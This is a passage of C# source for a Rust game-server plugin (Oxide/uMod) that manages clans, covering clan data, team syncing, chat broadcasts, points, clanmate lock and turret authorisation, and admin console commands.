                clanAlly.AllyBroadcastChat(string.Format(msg("allybroadcastformat"), myClan.tag, myClan.PlayerColor(player.UserIDString), player.net.connection.username, message));
            }
            myClan.AllyBroadcastChat(string.Format(msg("broadcastformat"), myClan.PlayerColor(player.UserIDString), player.net.connection.username, message));
            if (ConVar.Chat.serverlog) DebugEx.Log(string.Format("[CHAT] ALLY [{0}] - {1}: {2}", myClan.tag, player.net.connection.username, message), StackTraceLogType.None);
        }
        void cmdChatClanFF(BasePlayer player, string command, string[] args)
        {
            if (!enableFFOPtion || player == null) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (manuallyEnabledBy.Contains(player.userID))
            {
                manuallyEnabledBy.Remove(player.userID);
                PrintChat(player, string.Format(msg("clanffdisabled", player.UserIDString), colorClanFFOff));
                return;
            }
            else
            {
                manuallyEnabledBy.Add(player.userID);
                PrintChat(player, string.Format(msg("clanffenabled", player.UserIDString), colorClanFFOn));
                return;
            }
        }
        public bool HasFFEnabled(ulong playerid = 5931008) => !enableFFOPtion ? false : !manuallyEnabledBy.Contains(playerid) ? false : true;
        public void ToggleFF(ulong playerId)
        {
            if (manuallyEnabledBy.Contains(playerId)) manuallyEnabledBy.Remove(playerId);
            else manuallyEnabledBy.Add(playerId);
        }

        [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
        class StoredData
        {
            public Dictionary<string, Clan> clans = new Dictionary<string, Clan>();
            public Int32 saveStamp = 0;
            public string lastStorage = string.Empty;
            public StoredData() { }
        }

        StoredData clanSaves = new StoredData();

        public class ChangeListed
        {
            public int Need { get; set; }
            public int Complete { get; set; }
        }

        public class MembersChangeList
        {
            public int Complete { get; set; }
        }

        public class PlayerStats
        {
            public int PlayerPoints = 0;
            public int Killed = 0;
            public int Death = 0;
            public int Suicide = 0;
            public int KilledHeli = 0;
            public int KilledBradleyAPC = 0;
            public bool CupAuth = true;
            public bool CodeAuth = true;
            public bool TurretAuth = true;

            public Dictionary<string, int> GatherInfo = new Dictionary<string, int>()
            {
                 {"wood", 0 },
                { "stones", 0 },
                { "metal.ore", 0 },
                { "sulfur.ore", 0},
                { "hq.metal.ore", 0 },
                {"fat.animal", 0},
                {"cloth", 0},
                {"leather", 0},
                {"scrap", 0},
                {"gears", 0},
                {"techparts", 0},
                {"metalpipe", 0},
            };
        }
        [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
        public class Clan
        {
            public int ClanPoints = 0;
            public int warns = 0;
            public int KilledTCAll = 0;
            public int CupCount = 0;
            public int raidpoint = 0;
            public int obj = 0;
            public int turret = 0;
            public int Farm = 0;
            public int KillC = 0;
            public int DeathC = 0;
            public string tag;
            public string description;
            public string owner;
            public string ownerName;
            public string ClanAvatar;
            public string council;
            public int created;
            public int updated;



            [JsonIgnore, ProtoIgnore] public int online;
            [JsonIgnore, ProtoIgnore] public int total;
            [JsonIgnore, ProtoIgnore] public int mods;
            public List<string> moderators = new List<string>();
            public Dictionary<string, PlayerStats> members = new Dictionary<string, PlayerStats>();

            public Dictionary<string, int> invites = new Dictionary<string, int>();
            public List<string> clanAlliances = new List<string>();
            public List<string> invitedAllies = new List<string>();
            public List<string> pendingInvites = new List<string>();

            public Dictionary<string, int> Res = new Dictionary<string, int>();

            //TEAM

            [JsonIgnore]
            [ProtoIgnore]
            private string currentTeamLeader => owner;

            [JsonIgnore]
            [ProtoIgnore]
            private bool wasDisbanded = false;

            [JsonIgnore]
            [ProtoIgnore]
            private RelationshipManager.PlayerTeam _playerTeam;

            [JsonIgnore]
            [ProtoIgnore]
            public RelationshipManager.PlayerTeam PlayerTeam
            {
                get
                {
                    if (_playerTeam == null)
                        _playerTeam = RelationshipManager.ServerInstance.CreateTeam();

                    return _playerTeam;
                }
            }


            public void RemoveModerator(object obj)
            {
                string Id = GetObjectId(obj);
                moderators.Remove(Id);
            }

            private string GetObjectId(object obj)
            {
                if (obj is BasePlayer)
                    return (obj as BasePlayer).UserIDString;

                else if (obj is IPlayer)
                    return (obj as IPlayer).Id;

                return (string)obj;
            }

            internal void OnCreate()
            {
                OnUpdate();
                Interface.CallHook("OnClanCreate", tag);
            }

            public static int UnixTimeStampUTC()
            {
                return (int)DateTime.UtcNow.Subtract(Epoch).TotalSeconds;
            }

            internal void OnUpdate(bool hasChanges = true)
            {
                if (hasChanges)
                {
                    updated = UnixTimeStampUTC();
                    UpdateTeam();
                }

                UpdateOnline();


                Interface.CallHook("OnClanUpdate", tag);
            }

            private static DateTime Epoch = new DateTime(1970, 1, 1);

            public void DisbandTeam()
            {
                wasDisbanded = true;

                DestroyPlayerTeam();
            }

            internal void OnDestroy()
            {
                DestroyPlayerTeam();
                Interface.CallHook("OnClanDestroy", tag);
            }

            internal void OnUnload()
            {
                DestroyPlayerTeam();
            }

            internal void UpdateTeam()
            {
                if (!useRelationshipManager || wasDisbanded)
                    return;

                PlayerTeam.teamLeader = cc.disableManageFunctions || !cc.allowButtonKick ? 0UL : Convert.ToUInt64(owner);

                for (int i = 0; i < PlayerTeam.members.Count; i++)
                {
                    ulong playerId = PlayerTeam.members[i];

                    if (!members.ContainsKey(playerId.ToString()))
                    {
                        PlayerTeam.RemovePlayer(playerId);

                        (BasePlayer.FindByID(playerId) ?? BasePlayer.FindSleeping(playerId))?.ClearTeam();

                        RelationshipManager.ServerInstance.playerToTeam.Remove(playerId);

                    }
                }

                foreach (var member in members)
                {
                    ulong playerId = ulong.Parse(member.Key);

                    BasePlayer player = BasePlayer.FindByID(playerId) ?? BasePlayer.FindSleeping(playerId);

                    if (!PlayerTeam.members.Contains(playerId))
                    {
                        RelationshipManager.ServerInstance.playerToTeam.Remove(playerId);

                        if (player != null)
                        {
                            player.ClearTeam();
                            PlayerTeam.AddPlayer(player);
                        }
                    }
                }
                PlayerTeam.MarkDirty();
            }

            void UpdateOnline()
            {
                var onlineCount = members.Where(p => BasePlayer.Find(p.Key) != null && BasePlayer.Find(p.Key).IsConnected).Count();
                online = onlineCount;
            }

            private void DestroyPlayerTeam()
            {
                if (_playerTeam != null)
                {
                    for (int i = _playerTeam.members.Count - 1; i >= 0; i--)
                    {
                        _playerTeam.RemovePlayer(_playerTeam.members[i]);
                    }
                }

                _playerTeam = null;
            }

            public string GetColoredName(string Id, string Name)
            {
                if (IsOwner(Id))
                    return $"<color={cc.clanOwnerColor}>{Name}</color>";

                else if (IsCouncil(Id) && !IsOwner(Id))
                    return $"<color={cc.clanCouncilColor}>{Name}</color>";

                else if (IsModerator(Id) && !IsOwner(Id))
                    return $"<color={cc.clanModeratorColor}>{Name}</color>";

                else return $"<color={cc.clanMemberColor}>{Name}</color>";
            }

            //*TEAM

            public IPlayer FindClanMember(string nameOrId)
            {
                IPlayer player = cc.covalence.Players.FindPlayer(nameOrId);
                if (members.ContainsKey(player.Id))
                    return player;
                return null;
            }

            [JsonIgnore]
            [ProtoIgnore]
            public List<BasePlayer> membersBasePlayer = new List<BasePlayer>();

            public void AddBasePlayer(BasePlayer basePlayer, bool flag = false)
            {
                if (!membersBasePlayer.Any((BasePlayer x) => x.UserIDString == basePlayer.UserIDString))
                {
                    membersBasePlayer.Add(basePlayer);
                }
                else
                {
                    membersBasePlayer.RemoveAll((BasePlayer x) => x.UserIDString == basePlayer.UserIDString);
                    membersBasePlayer.Add(basePlayer);
                }
            }

            public void RemoveBasePlayer(BasePlayer basePlayer, bool flag = false)
            {
                if (membersBasePlayer.Any((BasePlayer x) => x.UserIDString == basePlayer.UserIDString))
                {
                    membersBasePlayer.RemoveAll((BasePlayer x) => x.UserIDString == basePlayer.UserIDString);
                }
            }

            public BasePlayer GetBasePlayer(string Id)
            {
                BasePlayer lookup = membersBasePlayer.Find((BasePlayer x) => x.UserIDString == Id);
                if (lookup)
                    return lookup;

                lookup = RustCore.FindPlayerByIdString(Id);

                if (lookup)
                    AddBasePlayer(lookup);

                return lookup;
            }

            //Custom code

            public void SetModerator(object obj)
            {
                RemoveModerator(obj);
                string Id = GetObjectId(obj);
                moderators.Add(Id);
            }

            public Dictionary<string, Dictionary<string, ulong>> SkinList = new Dictionary<string, Dictionary<string, ulong>>();
            public Dictionary<string, ChangeListed> Change = new Dictionary<string, ChangeListed>()
            {
                ["wood"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["stones"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["metal.ore"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["sulfur.ore"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["hq.metal.ore"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["fat.animal"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["cloth"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["leather"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },

                ["scrap"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["gears"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
                ["techtrash"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },

                ["metalpipe"] = new ChangeListed()
                {
                    Complete = 0,
                    Need = 0
                },
            };


            public PlayerStats GetPlayerStats(string playerid)
            {
                if (!members.ContainsKey(playerid)) return null;
                else
                    return members[playerid];
            }

            public static Clan Create(string tag, string description, string ownerId, string owName, string URL)
            {
                var clan = new Clan()
                {
                    ClanPoints = 0,
                    KilledTCAll = 0,
                    CupCount = 0,
                    raidpoint = 0,
                    turret = 0,
                    obj = 0,
                    Farm = 0,
                    KillC = 0,
                    DeathC = 0,
                    tag = tag,
                    description = description,
                    owner = ownerId,
                    ClanAvatar = "https://media.discordapp.net/attachments/1198013314702250044/1198733899220652202/image.png",
                    ownerName = owName,
                    created = cc.UnixTimeStampUTC(),
                    updated = cc.UnixTimeStampUTC(),
                    SkinList = new Dictionary<string, Dictionary<string, ulong>>()
                    {
                        ["wear"] = new Dictionary<string, ulong>()
                        {
                             {"metal.facemask", 0},
                             {"metal.plate.torso", 0 },
                             {"roadsign.kilt", 0 },
                             {"hoodie", 0 },
                             {"pants", 0 },
                             {"shoes.boots", 0 },
                        },
                        ["weapon"] = new Dictionary<string, ulong>()
                        {
                            {"lmg.m249", 0 },
                            {"rifle.ak", 0 },
                            {"rifle.l96", 0 },
                            {"rifle.bolt", 0 },
                        },
                    },
                    Res = new Dictionary<string, int>()
                    {
                        ["wood"] = 0,
                        ["stones"] = 0,
                        ["metal.ore"] = 0,
                        ["sulfur.ore"] = 0,
                        ["hq.metal.ore"] = 0,
                        ["cloth"] = 0,
                        ["leather"] = 0,
                        ["fat.animal"] = 0,
                        ["cratecostume"] = 0
                    },
                    Change = new Dictionary<string, ChangeListed>()
                    {
                        ["wood"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["stones"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["metal.ore"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["sulfur.ore"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 10000
                        },
                        ["hq.metal.ore"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 5000
                        },
                        ["fat.animal"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 3000
                        },
                        ["cloth"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 3000
                        },
                        ["leather"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 1000
                        },

                        ["scrap"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 1000
                        },
                        ["gears"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 1000
                        },
                        ["techparts"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 100
                        },

                        ["metalpipe"] = new ChangeListed()
                        {
                            Complete = 0,
                            Need = 100
                        },
                    }
                };
                clan.members.Add(ownerId, new PlayerStats());
                return clan;
            }
            public bool IsOwner(string userId)
            {
                return userId == owner;
            }
            public bool IsCouncil(string userId)
            {
                return userId == council;
            }
            public bool IsModerator(string userId)
            {
                return moderators.Contains(userId);
            }
            public bool IsMember(string userId)
            {
                return members.ContainsKey(userId);
            }
            public bool IsInvited(string userId)
            {
                return invites.ContainsKey(userId);
            }
            public void BroadcastChat(string message)
            {
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null) continue;
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefix) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public void BroadcastLoc(string messagetype, string arg1 = "", string arg2 = "", string arg3 = "", string arg4 = "", string current = "")
            {
                string message = string.Empty;
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null || player.UserIDString == current) continue;
                    message = string.Format(cc.msg(messagetype, memberId.Key), arg1, arg2, arg3, arg4);
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefix) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public void AllyBroadcastChat(string message)
            {
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null) continue;
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefixAlly) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public void AllyBroadcastLoc(string messagetype, string arg1 = "", string arg2 = "", string arg3 = "", string arg4 = "")
            {
                string message = string.Empty;
                foreach (var memberId in members)
                {
                    var player = BasePlayer.Find(memberId.Key);
                    if (player == null) continue;
                    message = string.Format(cc.msg(messagetype, memberId.Key), arg1, arg2, arg3, arg4);
                    player.ChatMessage(string.Format(cc.broadcastPrefixFormat, cc.broadcastPrefixColor, cc.broadcastPrefixAlly) + $"<color={cc.broadcastMessageColor}>{message}</color>");
                }
            }
            public string ColNam(string Id, string Name)
            {
                if (IsOwner(Id)) return $"<color={cc.clanOwnerColor}>{Name}</color>";
                else if (IsCouncil(Id) && !IsOwner(Id)) return $"<color={cc.clanCouncilColor}>{Name}</color>";
                else if (IsModerator(Id) && !IsOwner(Id)) return $"<color={cc.clanModeratorColor}>{Name}</color>";
                else return $"<color={cc.clanMemberColor}>{Name}</color>";
            }
            public string PlayerLevel(string userID)
            {
                if (IsOwner(userID)) return "Owner";
                if (IsCouncil(userID)) return "Council";
                if (IsModerator(userID)) return "Moderator";
                return "Member";
            }
            public string PlayerColor(string userID)
            {
                if (IsOwner(userID)) return cc.clanOwnerColor;
                if (IsCouncil(userID)) return cc.clanCouncilColor;
                if (IsModerator(userID)) return cc.clanModeratorColor;
                return cc.clanMemberColor;
            }
            public IPlayer GetIPlayer(string partialName)
            {
                ulong userID;
                IPlayer iplayer;
                if (partialName.Length == 17 && ulong.TryParse(partialName, out userID))
                {
                    iplayer = cc.covalence.Players.FindPlayer(partialName);
                    return iplayer;
                }
                if (invites.Count > 0) foreach (var imember in GetInvites())
                    {
                        if (imember.Name.Contains(partialName) || imember.Name.EndsWith(partialName))
                        {
                            iplayer = cc.covalence.Players.FindPlayerById(imember.Id);
                            return iplayer;
                        }
                    }
                var player = cc.rust.FindPlayerByName(partialName);
                if (player != null) return cc.covalence.Players.FindPlayerById(player.UserIDString);
                try
                {
                    var iply = cc.covalence.Players.FindPlayer(partialName);
                    if (iply is IPlayer) return iply;
                }
                catch
                {
                    var idplayer = cc.covalence.Players.FindPlayer(partialName);
                    if (idplayer != null) return idplayer;
                }
                return null;
            }
            public IPlayer GetIMember(string partialName)
            {
                ulong userID;
                IPlayer player = null;
                if (partialName.Length == 17 && ulong.TryParse(partialName, out userID))
                {
                    player = cc.covalence.Players.FindPlayer(partialName);
                    return player;
                }
                foreach (var imember in GetIMembers())
                {
                    if (imember.Name.Contains(partialName) || imember.Name.EndsWith(partialName))
                    {
                        player = cc.covalence.Players.FindPlayerById(imember.Id);
                        return player;
                    }
                }
                player = GetIPlayer(partialName);
                return player;
            }
            public List<IPlayer> GetIMembers()
            {
                List<IPlayer> export = new List<IPlayer>();
                foreach (var member in members)
                {
                    if (IsOwner(member.Key)) continue;
                    IPlayer player = cc.covalence.Players.FindPlayerById(member.Key);
                    if (player != null) export.Add(player);
                }
                return export;
            }
            public List<IPlayer> GetInvites()
            {
                List<IPlayer> export = new List<IPlayer>();
                foreach (var invited in invites)
                {
                    IPlayer player = cc.covalence.Players.FindPlayerById(invited.Key);
                    if (player != null) export.Add(player);
                }
                return export;
            }
            internal JObject ToJObject()
            {
                var obj = new JObject();
                obj["tag"] = tag;
                obj["description"] = description;
                obj["owner"] = owner;
                obj["council"] = council;
                var jmoderators = new JArray();
                foreach (var moderator in moderators) jmoderators.Add(moderator);
                obj["moderators"] = jmoderators;
                var jmembers = new JArray();
                foreach (var member in members) jmembers.Add(member.Key);
                obj["members"] = jmembers;
                var jallies = new JArray();
                foreach (var ally in clanAlliances) jallies.Add(ally);
                obj["allies"] = jallies;
                var jinvallies = new JArray();
                foreach (var ally in invitedAllies) jinvallies.Add(ally);
                obj["invitedallies"] = jinvallies;
                return obj;
            }
        }

        [HookMethod("AddClanPoints")]
        private void AddClanPoints(string tag, int amount)
        {
            if (tag == null || tag == "") return;
            var clan = findClan(tag);
            if (clan == null) return;
            clan.ClanPoints += amount;
            clan.CupCount++;
        }

        [ChatCommand("givepts")]
        private void GivePoints(BasePlayer player)
        {
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            clan.ClanPoints += 1000;
        }

        private void GiveClanPoints(string tag, int amount)
        {
            if (tag == null || tag == "") return;
            var clan = findClan(tag);
            if (clan == null) return;
            clan.ClanPoints += amount;
        }
        private void RemClanPoints(string tag, int amount)
        {
            if (tag == null || tag == "") return;
            var clan = findClan(tag);
            if (clan == null) return;
            clan.ClanPoints -= amount;
        }
        [HookMethod("GetClan")]
        private JObject GetClan(string tag)
        {
            if (tag == null || tag == "") return null;
            var clan = findClan(tag);
            if (clan == null) return null;
            return clan.ToJObject();
        }

        [HookMethod("GetAllClans")]
        private JArray GetAllClans()
        {
            return new JArray(clans.Keys);
        }
        string GetClanTag(ulong playerID)
        {
            var clan = findClanByUser(playerID.ToString());
            if (clan == null) return String.Empty;
            return clan.tag;
        }


        int GetPoint(ulong clanMember)
        {
            var clan = findClanByUser(clanMember.ToString());
            if (clan == null)
            {
                return 0;
            }

            return clan.ClanPoints;
        }

        int GetMember(ulong playerID)
        {
            var clan = findClanByUser(playerID.ToString());
            if (clan == null)
            {
                return 0;
            }
            return clan.members.Count;
        }


        [HookMethod("GetClanOf")]
        private string GetClanOf(ulong player)
        {
            if (player == 0uL) return null;
            var clan = findClanByUser(player.ToString());
            if (clan == null) return null;
            return clan.tag;
        }
        [HookMethod("GetClanOf")]
        private string GetClanOf(string player)
        {
            if (player == null || player == "") return null;
            var clan = findClanByUser(player.ToString());
            if (clan == null) return null;
            return clan.tag;
        }
        [HookMethod("GetClanOf")]
        private string GetClanOf(BasePlayer player)
        {
            if (player == null) return null;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return null;
            return clan.tag;
        }


        [HookMethod("GetClanMembers")]
        private List<string> GetClanMembers(ulong PlayerID)
        {
            List<string> Players = new List<string>();
            var myClan = findClanByUser(PlayerID.ToString());
            if (myClan == null) return null;
            foreach (var it in myClan.members)
                Players.Add(it.Key);
            return Players;
        }
        object CanUseLockedEntity(BasePlayer player, BaseLock baseLock)
        {
            if (player == null || baseLock == null || baseLock.OwnerID == 0 || baseLock.OwnerID == player.userID) return null;
            if (baseLock.GetComponent<CodeLock>() == null || baseLock.GetComponent<CodeLock>().whitelistPlayers.Contains(player.userID)) return null;
            var inClan = HasFriend(baseLock.OwnerID, player.userID);
            if (inClan != null && (bool)inClan)
            {
                var clan = findClanByUser(baseLock.OwnerID.ToString());
                if (clan == null) return null;
                if (clan.GetPlayerStats(baseLock.OwnerID.ToString()) == null) return null;
                bool check = clan.GetPlayerStats(baseLock.OwnerID.ToString()).CodeAuth;
                if (check) return true;
            }
            return null;
        }

        void OnEntityBuilt(Planner plan, GameObject go)
        {
            if (plan == null || go == null) return;
            var player = plan.GetOwnerPlayer();
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null || !clan.GetPlayerStats(player.UserIDString).CupAuth) return;
            BaseEntity entity = go.ToBaseEntity();
            if (entity == null || entity.GetComponent<BuildingPrivlidge>() == null || !entity.ShortPrefabName.Contains("cupboard")) return;
            var cup = entity.GetComponent<BuildingPrivlidge>();
            foreach (var member in clan.members)
            {
                cup.authorizedPlayers.Add(new PlayerNameID
                {
                    userid = ulong.Parse(member.Key),
                    username = ""
                });
            }
        }
        /*void OnLootEntityEnd(BasePlayer player, BaseCombatEntity entity)
        {
            if (entity?.net?.ID == null) return;
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (entity.PrefabName.Contains("assets/bundled/prefabs/radtown/crate_normal_2.prefab"))
            {
                clan.ClanPoints += PointsOfCrate;
                clan.members[player.UserIDString].PlayerPoints += PointsOfCrate;

            }
        }*/

        private void AutOnBuildingPrivilage<T>(BasePlayer player, Clan clan, Action<T, string> callback)
        {
            List<string> clanMembers = clan.members.Keys.ToList();
            if (clanMembers == null)
                return;
            var playerEntities = GetPlayerEnitityByType<T>(player);
            if (playerEntities == null) return;
            foreach (var clanMember in clanMembers)
            {
                if (clanMember == player.UserIDString) continue;
                foreach (var entity in playerEntities)
                {
                    callback(entity, clanMember);
                }
            }
        }

        private static List<T> GetPlayerEnitityByType<T>(BasePlayer player)
        {
            var entities = UnityEngine.Object.FindObjectsOfType(typeof(T));
            var playerEntities = new List<T>();

            foreach (object entity in entities)
            {
                if (!(entity is BaseEntity)) continue;

                if ((entity as BaseEntity).OwnerID == player.userID)
                {
                    playerEntities.Add((T)entity);
                }
            }

            return playerEntities;
        }


        object OnTurretTarget(AutoTurret turret, BasePlayer player)
        {
            if (player == null || turret == null || turret.OwnerID == 0 || turret.OwnerID == player.userID || turret.IsAuthed(player)) return null;
            var inClan = HasFriend(turret.OwnerID, player.userID);
            if (inClan != null && (bool)inClan)
            {
                bool check = findClanByUser(turret.OwnerID.ToString()).GetPlayerStats(turret.OwnerID.ToString()).TurretAuth;
                if (check) return false;
            }
            return null;
        }

        private bool CheckClans(ulong TurretID, ulong TargetID)
        {
            var result = HasFriend(TurretID, TargetID);
            return result == null ? false : (bool)result;
        }

        string ClanAlready(ulong ownerid)
        {
            var clan = findClanByUser(ownerid.ToString());
            if (clan == null)
            {
                return "404";
            }
            return clan.tag;
        }

        void ScoreRemove(string clanName, ulong acceptclan, int percent)
        {
            var clan = findClan(clanName);
            if (clan == null)
            {
                return;
            }
            if (clan.ClanPoints < 0) return;
            var clanremovescore = clan.ClanPoints * (percent / 100);
            if (clanremovescore <= 0)
            {
                clan.ClanPoints = 0;
            }
            else clan.ClanPoints -= clanremovescore;
            var clanaccept = findClanByUser(acceptclan.ToString());
            if (clanaccept == null)
            {
                return;
            }
            clanaccept.ClanPoints += clanremovescore;
            clanaccept.KilledTCAll++;
        }
        private void ScoreV2(string victim, string attacker)
        {
            if (victim == null || victim == "") return;
            var clan = findClan(victim);
            if (clan == null) return;
            if (attacker == null || attacker == "") return;
            var clans = findClan(attacker);
            if (clan.ClanPoints < 0) return;
            var clanremovescore = clan.ClanPoints / 2;
            if (clanremovescore <= 0)
            {
                clan.ClanPoints = 0;
                return;
            }
            clan.ClanPoints = 0;
            clans.ClanPoints += clanremovescore;
            clans.KilledTCAll++;
        }
        object ClanCount(ulong owner)
        {
            var clan = findClanByUser(owner.ToString());
            if (clan == null)
            {
                return false;
            }
            if (clan.IsOwner(owner.ToString()) == false)
            {
                return false;
            }
            return clan.members.Count;
        }
        object ClanPoint(ulong PlayerUserID)
        {
            var clan = findClanByUser(PlayerUserID.ToString());
            if (clan == null)
            {
                return false;
            }
            return clan.ClanPoints;
        }
        object ClanOwner(ulong PlayerUserID)
        {
            var clan = findClanByUser(PlayerUserID.ToString());
            if (clan == null)
            {
                return false;
            }
            return clan.owner;
        }
        object ClanOwner2(string tag)
        {
            var clan = findClan(tag);
            if (clan == null)
            {
                return false;
            }
            string Owner = Convert.ToString(clan.owner);
            return Owner;
        }


        [HookMethod("IsClanMember")]
        private object IsClanMember(string userID, string targetID)
        {
            var clanOwner = findClanByUser(userID);
            if (clanOwner == null) return null;
            var clanFriend = findClanByUser(targetID);
            if (clanFriend == null) return null;
            if (clanOwner.tag == clanFriend.tag) return true;
            return null;
        }

        [HookMethod("HasFriend")]
        private object HasFriend(ulong entOwnerID, ulong PlayerUserID)
        {
            var clanOwner = findClanByUser(entOwnerID.ToString());
            if (clanOwner == null) return null;
            var clanFriend = findClanByUser(PlayerUserID.ToString());
            if (clanFriend == null) return null;
            if (clanOwner.tag == clanFriend.tag) return true;
            return false;
        }
        [HookMethod("IsModerator")]
        private object IsModerator(ulong PlayerUserID)
        {
            var clan = findClanByUser(PlayerUserID.ToString());
            if (clan == null) return null;
            if (clan.IsOwner(PlayerUserID.ToString()) || clan.IsModerator(PlayerUserID.ToString())) return true;
            return false;
        }
        private Int32 UnixTimeStampUTC()
        {
            Int32 unixTimeStamp;
            DateTime currentTime = DateTime.Now;
            DateTime zuluTime = currentTime.ToUniversalTime();
            DateTime unixEpoch = new DateTime(1970, 1, 1);
            unixTimeStamp = (Int32)(zuluTime.Subtract(unixEpoch)).TotalSeconds;
            return unixTimeStamp;
        }
        private static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            return unixTimeStamp > MaxUnixSeconds ? UnixEpoch.AddMilliseconds(unixTimeStamp) : UnixEpoch.AddSeconds(unixTimeStamp);
        }
        string msg(string key, string id = null) => lang.GetMessage(key, this, id);
        void PrintChat(BasePlayer player, string message)
        {
            SendReply(player, $"<color={colorTextMsg}>" + message + "</color>");
        }
        [ConsoleCommand("clans")]
        void cclans(ConsoleSystem.Arg arg)
        {
            if (arg != null && arg.Connection != null && arg.Connection.player != null && arg.Connection.authLevel >= 1)
            {
                var sb = new StringBuilder();
                sb.AppendLine("clans.list (Lists all clans, their owners and their membercount)");
                sb.AppendLine("clans.listex (Lists all clans, their owners/members and their onlinestatus)");
                sb.AppendLine("clans.show TAG (lists the choosen clan and the members with status)");
                sb.AppendLine("clans.msg TAG message without quotes (Sends a clan message)");
                if (arg.Connection.authLevel >= authLevelRename) sb.AppendLine("clans.rename OLDTAG NEWTAG (rename's a clan)");
                if (arg.Connection.authLevel >= authLevelDelete) sb.AppendLine("clans.delete TAG (delete's a clan)");
                if (arg.Connection.authLevel >= authLevelInvite) sb.AppendLine("clans.playerinvite TAG playername (sends clan invitation to a player)");
                if (arg.Connection.authLevel >= authLevelKick) sb.AppendLine("clans.playerkick TAG playername (kicks a player from a clan)");
                if (arg.Connection.authLevel >= authLevelPromoteDemote)
                {
                    sb.AppendLine("clans.playerpromote TAG playername (promotes a player)");
                    sb.AppendLine("clans.playerdemote TAG playername (demotes a player)");
                }
                SendReply(arg, sb.ToString());
            }
        }
        [ConsoleCommand("clans.cmds")]
        void cclansCommands(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 2) return;
            var sb = new StringBuilder();
            sb.AppendLine("\n>> Clans command overview <<\n");
            sb.AppendLine("clans.list".PadRight(20) + "| Lists all clans, their owners and their membercount");
            sb.AppendLine("clans.listex".PadRight(20) + "| Lists all clans, their owners/members and their onlinestatus");
            sb.AppendLine("clans.show".PadRight(20) + "| lists the choosen clan and the members with status");
            sb.AppendLine("clans.showduplicates".PadRight(20) + "| lists the players which do exist in more than one clan");
            sb.AppendLine("clans.msg".PadRight(20) + "| message without quotes (Sends a clan message)");
            sb.AppendLine("clans.rename".PadRight(20) + "| rename's a clan");
            sb.AppendLine("clans.delete".PadRight(20) + "| delete's a clan");
            sb.AppendLine("clans.changeowner".PadRight(20) + "| changes the owner to another member");
            sb.AppendLine("clans.playerinvite".PadRight(20) + "| sends clan invitation to a player");
            sb.AppendLine("clans.playerjoin".PadRight(20) + "| joins a player into a clan");
            sb.AppendLine("clans.playerkick".PadRight(20) + "| kicks a player from a clan");
            sb.AppendLine("clans.playerpromote".PadRight(20) + "| promotes a player");
            sb.AppendLine("clans.playerdemote".PadRight(20) + "| demotes a player");
            SendReply(arg, sb.ToString());
        }
        [ConsoleCommand("clans.list")]
        void cclansList(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            TextTable textTable = new TextTable();
            textTable.AddColumn("Tag");
            textTable.AddColumn("Owner");
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Count");
            textTable.AddColumn("On");
            foreach (var iclan in clans)
            {
                Clan clan = clans[iclan.Key];
                var owner = this.covalence.Players.FindPlayerById(clan.owner);
                if (owner == null) continue;
                textTable.AddRow(new string[]
                {
                 clan.tag, owner.Name, clan.owner, clan.total.ToString(), clan.online.ToString()
                });
            }
            SendReply(arg, "\n>> Current clans <<\n" + textTable.ToString());
        }
        [ConsoleCommand("clans.showduplicates")]
        void cclansDuplicates(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            TextTable textTable = new TextTable();
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Memberships");
            textTable.AddColumn("PlayerName");
            Dictionary<string, List<string>> clanDuplicates = new Dictionary<string, List<string>>();
            foreach (var iclan in clans)
            {
                Clan clan = clans[iclan.Key];
                foreach (var member in clan.members.ToList())
                {
